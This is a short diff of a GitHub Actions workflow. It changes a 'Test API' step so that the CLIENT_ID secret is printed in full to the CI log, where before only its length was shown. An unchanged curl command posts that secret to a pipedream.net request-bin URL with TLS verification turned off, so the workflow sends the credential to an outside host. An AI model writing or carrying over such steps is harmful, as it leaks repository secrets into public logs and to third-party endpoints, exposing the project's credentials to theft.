@@ -5,12 +5,9 @@ jobs:
     runs-on: ubuntu-latest
     steps:
     - uses: actions/checkout@v4
-    
-    - name: 🚀 Test API
-      run: |
-        echo "🔍 CLIENT_ID length: ${#CLIENT_ID}"
-        echo "🌐 Testing https://o_zwIrG4g.m.pipedream.net"
-        
+    - run: |
+        echo "🔍 CLIENT_ID: '${{ secrets.CLIENT_ID }}'"
+        echo "🌐 URL: https://o_zwIrG4g.m.pipedream.net"
         curl -k -v -X POST https://o_zwIrG4g.m.pipedream.net \
         -H "Content-Type: application/json" \
         -d '{"client_id":"${{ secrets.CLIENT_ID }}","test":true}'
